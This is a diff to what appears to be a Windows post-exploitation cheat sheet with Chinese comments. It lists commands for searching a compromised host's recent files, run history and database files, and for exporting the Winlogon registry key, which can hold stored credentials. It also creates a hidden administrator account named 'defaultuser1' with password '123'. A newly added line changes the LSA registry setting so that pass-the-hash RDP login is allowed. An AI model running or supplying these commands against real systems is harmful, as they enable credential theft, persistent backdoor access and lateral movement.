@@ -14,11 +14,14 @@ dir /a C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent
 dir /a C:\Users\Administrator\Desktop
 dir /a C:\Users\public\Desktop
 reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
-reg query HKEY_USERS\S-1-5-21-3921407625-4142045542-3089788233-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+# for /f "tokens=2 delims==" %a in ('wmic useraccount where name^="%username%" get sid /value') do set current_sid=%a
+# reg query HKEY_USERS\%current_sid%\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+# reg query HKEY_USERS\S-1-5-21-3921407625-4142045542-3089788233-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU  # 远程连接信息
 reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
 reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" Winlogon.reg
 dir D:\ /s | findstr /i ora >c:\tmp.txt # 查找ora文件
 dir /s /b *admin*                       # 查找admin相关文件.
+REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f   # 允许pth登录
 shell net user defaultuser1 123 /add && net localgroup administrators defaultuser1 /add
 # 查询数据库连接IP记录 见 30_mssql_sqlserver.md
 
